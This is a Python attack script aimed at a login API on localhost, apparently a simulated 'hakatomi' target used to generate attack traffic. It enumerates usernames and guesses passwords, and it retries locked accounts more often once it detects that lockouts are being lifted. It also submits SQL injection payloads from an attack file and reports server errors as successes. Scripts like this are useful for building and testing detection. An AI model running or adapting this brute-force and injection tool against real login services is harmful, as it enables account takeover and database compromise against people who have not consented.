import os
import random
import sys

sys.path.insert(1, os.path.join(sys.path[0], "../hakatomi.com"))

from api.drivers.creds import generate_passwords
from api.drivers.creds import generate_usernames
from api.drivers import read_random_lines

import requests
import time
import orjson
from enum import Enum, auto
from dataclasses import dataclass
from typing import Optional, List
import random
from orso.tools import random_string


class UserStatus(Enum):
    new = auto()
    active = auto()
    locked = auto()
    invalid = auto()
    unknown = auto()
    cracked = auto()

@dataclass
class User():
    username:str
    password:Optional[str] = None
    status: UserStatus = UserStatus.unknown

    def make_auth_payload(self):
        if self.password is None:
            password = "AAAA"
        else:
            password = self.password

        return orjson.dumps({
            "username": self.username,
            "password": password
        })

HAKATOMI_URL:str = "http://localhost:8080/v1/authenticate"
DWELL: int = 0.1

unlocked_users: int = 0
users = {}
sql_injections = []
potential_sql_injections = []

def randomly_select_user(statuses: List[UserStatus]) -> User:
    return random.choice([v for k, v in users.items() if v.status in statuses] + [None])

def choose_random_username() -> str:
    if not hasattr(choose_random_username, 'cache') or not choose_random_username.cache:
        choose_random_username.cache = generate_usernames(1000)
    if random.random() < 0.1:
        return random_string(8)
    return choose_random_username.cache.pop()

def randomly_select_sql_injection() -> str:
    if potential_sql_injections:
        return potential_sql_injections.pop()
    
def issue_request(user:User):
    attempt = requests.post(url=HAKATOMI_URL, data=user.make_auth_payload())

    if attempt.text == '"user"':
        user.status = UserStatus.invalid
    elif attempt.text == '"locked"':
        user.status = UserStatus.locked
    elif attempt.text == '"password"':
        user.status = UserStatus.active
    elif attempt.status_code == 500:
        pass
    else:
        print(attempt.text)
        quit()

    return attempt.status_code, attempt.text

if __name__ == "__main__":

    # get the sql injections from the attack file
    potential_sql_injections = read_random_lines("assets/sql_injection.txt")

    while True:
        time.sleep(DWELL)
        if random.random() < 0.5:
            # 50% of the time, guess a new username
            username = choose_random_username()
            cycles = 0
            while username in users:
                cycles += 1
                if cycles > 10:
                    print("I may have run out of usernames to guess")
                    username = None
                    break
                username = choose_random_username()
            if username:
                user = User(username=username)
                users[username] = user
                print(f"[{len(users)}] Trying {user.username}, not even sure they exist")
                issue_request(user)
        
        if random.random() < 0.50:
            # 50% of the time, attempt a new password user
            user = randomly_select_user([UserStatus.unknown, UserStatus.active, UserStatus.new])
            if user:
                print(f"[{len(users)}] Trying {user.username}, who last time I checked was {user.status}.")
                issue_request(user)

        if (unlocked_users < 3 and random.random() < 0.10) or (unlocked_users >= 3):
            # 10% of the time, attempt new password for a already locked account
            # unless we've detected that previously locked users are getting unlocked
            # then we increase the amount of attempts we do for these users
            user = randomly_select_user([UserStatus.locked])
            if user:
                print(f"[{len(users)}] Trying {user.username}, who last time I checked was {user.status}.")
                status, message = issue_request(user)
                if message == "locked":
                    unlocked_users = 0
                else:
                    unlocked_users += 1

        if random.random() < 0.10:
            # 10% of the time, attempt a SQL injection
            payload = randomly_select_sql_injection()
            if payload:
                print("Trying SQL injection - ", payload)
                user = User(username=payload)
                status, message = issue_request(user)
                if status == 500:
                    print("WORKED", status, message)
                pass
